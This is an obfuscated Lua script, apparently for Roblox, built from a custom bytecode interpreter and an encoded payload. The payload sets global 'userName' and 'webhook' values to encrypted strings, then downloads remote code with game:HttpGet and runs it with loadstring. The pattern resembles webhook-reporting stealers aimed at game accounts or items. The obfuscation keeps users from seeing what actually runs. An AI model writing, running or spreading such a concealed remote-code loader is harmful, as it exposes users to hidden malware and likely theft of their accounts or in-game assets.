local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 79) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				Exponent = 1;
				IsNormal = 0;
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					Inst[3] = gBits16();
					Inst[4] = gBits16();
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					Inst[3] = gBits32() - (2 ^ 16);
					Inst[4] = gBits16();
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1];
				if (Enum <= 26) then
					if (Enum <= 12) then
						if (Enum <= 5) then
							if (Enum <= 2) then
								if (Enum <= 0) then
									local NewProto = Proto[Inst[3]];
									local NewUvals;
									local Indexes = {};
									NewUvals = Setmetatable({}, {__index=function(_, Key)
										local Val = Indexes[Key];
										return Val[1][Val[2]];
									end,__newindex=function(_, Key, Value)
										local Val = Indexes[Key];
										Val[1][Val[2]] = Value;
									end});
									for Idx = 1, Inst[4] do
										VIP = VIP + 1;
										local Mvm = Instr[VIP];
										if (Mvm[1] == 37) then
											Indexes[Idx - 1] = {Stk,Mvm[3]};
										else
											Indexes[Idx - 1] = {Upvalues,Mvm[3]};
										end
										Lupvals[#Lupvals + 1] = Indexes;
									end
									Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
								elseif (Enum > 1) then
									local A = Inst[2];
									local Index = Stk[A];
									local Step = Stk[A + 2];
									if (Step > 0) then
										if (Index > Stk[A + 1]) then
											VIP = Inst[3];
										else
											Stk[A + 3] = Index;
										end
									elseif (Index < Stk[A + 1]) then
										VIP = Inst[3];
									else
										Stk[A + 3] = Index;
									end
								else
									Stk[Inst[2]] = {};
								end
							elseif (Enum <= 3) then
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Stk[A + 1]));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							elseif (Enum == 4) then
								Stk[Inst[2]]();
							else
								local A = Inst[2];
								do
									return Stk[A](Unpack(Stk, A + 1, Inst[3]));
								end
							end
						elseif (Enum <= 8) then
							if (Enum <= 6) then
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							elseif (Enum > 7) then
								Stk[Inst[2]] = {};
							else
								Stk[Inst[2]] = Stk[Inst[3]] % Inst[4];
							end
						elseif (Enum <= 10) then
							if (Enum > 9) then
								do
									return;
								end
							else
								local A = Inst[2];
								local Index = Stk[A];
								local Step = Stk[A + 2];
								if (Step > 0) then
									if (Index > Stk[A + 1]) then
										VIP = Inst[3];
									else
										Stk[A + 3] = Index;
									end
								elseif (Index < Stk[A + 1]) then
									VIP = Inst[3];
								else
									Stk[A + 3] = Index;
								end
							end
						elseif (Enum == 11) then
							Stk[Inst[2]] = Inst[3] + Stk[Inst[4]];
						else
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						end
					elseif (Enum <= 19) then
						if (Enum <= 15) then
							if (Enum <= 13) then
								VIP = Inst[3];
							elseif (Enum > 14) then
								VIP = Inst[3];
							else
								Stk[Inst[2]] = Stk[Inst[3]] % Stk[Inst[4]];
							end
						elseif (Enum <= 17) then
							if (Enum > 16) then
								local A = Inst[2];
								local B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
							else
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Stk[A + 1]));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							end
						elseif (Enum > 18) then
							Stk[Inst[2]]();
						else
							local A = Inst[2];
							local Step = Stk[A + 2];
							local Index = Stk[A] + Step;
							Stk[A] = Index;
							if (Step > 0) then
								if (Index <= Stk[A + 1]) then
									VIP = Inst[3];
									Stk[A + 3] = Index;
								end
							elseif (Index >= Stk[A + 1]) then
								VIP = Inst[3];
								Stk[A + 3] = Index;
							end
						end
					elseif (Enum <= 22) then
						if (Enum <= 20) then
							Stk[Inst[2]] = Stk[Inst[3]] % Inst[4];
						elseif (Enum > 21) then
							local A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
						else
							Stk[Inst[2]] = Inst[3];
						end
					elseif (Enum <= 24) then
						if (Enum > 23) then
							local A = Inst[2];
							do
								return Stk[A](Unpack(Stk, A + 1, Inst[3]));
							end
						else
							Env[Inst[3]] = Stk[Inst[2]];
						end
					elseif (Enum == 25) then
						Stk[Inst[2]] = Env[Inst[3]];
					else
						do
							return;
						end
					end
				elseif (Enum <= 39) then
					if (Enum <= 32) then
						if (Enum <= 29) then
							if (Enum <= 27) then
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Top)));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							elseif (Enum == 28) then
								local A = Inst[2];
								do
									return Unpack(Stk, A, Top);
								end
							else
								Stk[Inst[2]] = Inst[3] + Stk[Inst[4]];
							end
						elseif (Enum <= 30) then
							local A = Inst[2];
							local B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
						elseif (Enum == 31) then
							Stk[Inst[2]] = Inst[3];
						else
							local NewProto = Proto[Inst[3]];
							local NewUvals;
							local Indexes = {};
							NewUvals = Setmetatable({}, {__index=function(_, Key)
								local Val = Indexes[Key];
								return Val[1][Val[2]];
							end,__newindex=function(_, Key, Value)
								local Val = Indexes[Key];
								Val[1][Val[2]] = Value;
							end});
							for Idx = 1, Inst[4] do
								VIP = VIP + 1;
								local Mvm = Instr[VIP];
								if (Mvm[1] == 37) then
									Indexes[Idx - 1] = {Stk,Mvm[3]};
								else
									Indexes[Idx - 1] = {Upvalues,Mvm[3]};
								end
								Lupvals[#Lupvals + 1] = Indexes;
							end
							Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
						end
					elseif (Enum <= 35) then
						if (Enum <= 33) then
							Env[Inst[3]] = Stk[Inst[2]];
						elseif (Enum == 34) then
							Stk[Inst[2]] = Upvalues[Inst[3]];
						else
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						end
					elseif (Enum <= 37) then
						if (Enum == 36) then
							Stk[Inst[2]] = Stk[Inst[3]];
						else
							Stk[Inst[2]] = Stk[Inst[3]];
						end
					elseif (Enum == 38) then
						Stk[Inst[2]] = Stk[Inst[3]] + Inst[4];
					else
						Stk[Inst[2]] = Stk[Inst[3]] % Stk[Inst[4]];
					end
				elseif (Enum <= 46) then
					if (Enum <= 42) then
						if (Enum <= 40) then
							local A = Inst[2];
							Stk[A](Unpack(Stk, A + 1, Top));
						elseif (Enum > 41) then
							local A = Inst[2];
							do
								return Unpack(Stk, A, Top);
							end
						else
							Stk[Inst[2]] = #Stk[Inst[3]];
						end
					elseif (Enum <= 44) then
						if (Enum == 43) then
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Top)));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						else
							local A = Inst[2];
							local Step = Stk[A + 2];
							local Index = Stk[A] + Step;
							Stk[A] = Index;
							if (Step > 0) then
								if (Index <= Stk[A + 1]) then
									VIP = Inst[3];
									Stk[A + 3] = Index;
								end
							elseif (Index >= Stk[A + 1]) then
								VIP = Inst[3];
								Stk[A + 3] = Index;
							end
						end
					elseif (Enum == 45) then
						Stk[Inst[2]] = #Stk[Inst[3]];
					elseif not Stk[Inst[2]] then
						VIP = VIP + 1;
					else
						VIP = Inst[3];
					end
				elseif (Enum <= 49) then
					if (Enum <= 47) then
						Stk[Inst[2]] = Upvalues[Inst[3]];
					elseif (Enum == 48) then
						Stk[Inst[2]] = Stk[Inst[3]] + Inst[4];
					else
						local A = Inst[2];
						Stk[A](Unpack(Stk, A + 1, Top));
					end
				elseif (Enum <= 51) then
					if (Enum == 50) then
						if not Stk[Inst[2]] then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					else
						Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
					end
				elseif (Enum == 52) then
					Stk[Inst[2]] = Env[Inst[3]];
				else
					local A = Inst[2];
					Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
				end
				VIP = VIP + 1;
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!133O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403083O00757365724E616D6503783O00422F7E3D7C36556B3E52593F5E6E5926745B5A4E4B535749203E385F365C5441224337683574222C375E372O22373662387D224D373F223F37663A70226F37483A622234374E3638225E3B312243364D3A4B225A3627374D22443659375122773A6A224B3A7722253629393E226536373E3F226A3733382803073O00776562682O6F6B03AC042O004261426A7522776054603A4C3951554D7A56787A3A644F5E706B7841662C58484A495A2B596C5C2E537A3C2A3C365B4252604F3B5B2F4C7E387158345F235E6674715E5F6D395C313A2952515D5A6D594D2E566A5B595A633B475D315761786B597D5B2C6632723447763C2C526455445E4F7D245C6D5E64372F586E5B45516835705836733754456E334D6B3B365044715869665731463D5773752E546E564D203557453C3F4D246E7A74346D244A52374A5F4C39216C3C67213B3F4F61496D76786F292O6C4A3D662A79345D6F55346B7C67607D21523B66316A6073224A5B7A3053654963597A366855285F46487B7822545736486A5274263579553F6E7776534D403D316D2773647A6147726C53747335574F45783F774B5F76673E5A366E2649253B5574346C72464F564868547C5B3E7B7C685B283D655F454B307131367852384E3E7071223E364F3679223F3B3A222436243E6B222O36303C33225436433D21227136773B7E222A37742227375E36622241373C36532237366B3671224E375F384D227936393E6F2278364136352269362O377B222A365E3930223A372E222B363335592247387422523627373D2234372C224E365E376C227237493721224E36283A3422273A2522503850224D372B376A223E36603C6C224A3667354B224F37472O3522243E392272374B225B36423853224036333C2E2243384C22663D63226E3933225C3724353E2259367E3D5A222F36393D2E22403A33225637333A30223936573655224F3740223C39262262367D364122593C2O223B376C3664227336353C23226A362E3C6D223736253B28226036713B60227336393728227437473523225A36493D782276364A3C32224537783A77223F36483B47224236713B532247386F22213854225E362D227A36532O3E224936783B672275367C3E6B22753A7D2228364D3E672276362A392F222336223B67227A362E3A3E222736572O38226D3864223E3763384D22303B6E224C362D3549224E362B3834224B3E5E223A3736382422703626376622423746363E22463744225B36233751224136723730222E392C2225364A38412248366D3A25226F3D62227D377C3966225936783631227E362E3C79225C3E4E226A397E224D387E225E36553529227C362F3C3122253C61227C36653A2D224F36303E7B225A377B3A4A2236375D38462228365F3C7A2238376E227B3645387A2270392F2267367422503C63224A364B3C5C226336273929224737693A462249364B223837533924227C396F225236763D432254375F3735223D3A35223A3672354B226A3A2O22453E4022773C6622733B39227E366B3B31224737623837223437302O223D5322653937223C36633E362248373A362122463E51222A3D52223C3D2O22352O36375522513B6D224239732258362B3D21225F3671354022713772367B2256393C22603C59225C3660225D36513C62225C367C3C5D22473738372D223F36323749224536393A67223A3E2E227637523923226C37343566227E36252O382267365F38552264372B386C2245366E3871227536623E242239373E226D365E37592251364C3521223037463960227C367D357122613771223F3634383A2271377E392522623E5B2232363022633742367C22763671226236403579030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034A3O00D9D7CF35F5E18851C3C2CC6BE1B2D316C4C1CE36E3A9C411DFD7DE2BF2F5C411DC8CE826F4B2D70AC28EEF20F4B6C21A9EF0D837EFABD30DEEE1DE31E7F4CA1FD8CD9428EBE98912C4C203083O007EB1A3BB4586DBA700264O00017O001234000100013O002033000100010002001234000200013O002033000200020003001234000300013O002033000300030004001234000400053O0006320004000B0001000100040F3O000B0001001234000400063O002033000500040007001234000600083O002033000600060009001234000700083O00203300070007000A00062O00083O000100062O00253O00074O00253O00014O00253O00054O00253O00024O00253O00034O00253O00063O00121F0009000C3O0012170009000B3O00121F0009000E3O0012170009000D3O0012340009000F3O001234000A00103O00201E000A000A00112O0024000C00083O00121F000D00123O00121F000E00134O0023000C000E4O002B000A6O001600093O00022O00130009000100012O001A3O00013O00013O00023O00026O00F03F026O00704002264O000100025O00121F000300014O002D00045O00121F000500013O0004020003002100012O002F00076O0024000800024O002F000900014O002F000A00024O002F000B00034O002F000C00044O0024000D6O0024000E00063O002030000F000600012O0023000C000F4O0016000B3O00022O002F000C00034O002F000D00044O0024000E00014O002D000F00014O0027000F0006000F00100B000F0001000F2O002D001000014O002700100006001000100B0010000100100020300010001000012O0023000D00104O002B000C6O0016000A3O0002002014000A000A00022O00100009000A4O002800073O000100042C0003000500012O002F000300054O0024000400024O0005000300044O001C00036O001A3O00017O00", GetFEnv(), ...);
